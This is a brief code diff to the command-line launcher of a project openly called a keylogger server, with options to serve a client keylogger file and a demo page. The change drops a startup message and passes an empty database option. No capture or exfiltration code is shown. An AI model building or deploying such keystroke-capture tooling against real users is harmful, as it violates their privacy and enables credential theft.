@@ -34,12 +34,12 @@ program
   .option('-c, --client', 'Serve the client keylogger file')
   .option('-d, --demo', 'Serve the demo client page')
   .action(options => {
-    console.log('Booting the keylogger server.', '\n');
     keyloggerServer({
       serveDemo: options.demo,
       serveClient: options.client,
       hostname: options.hostname,
-      port: options.port
+      port: options.port,
+      database: {}
     });
   })
 
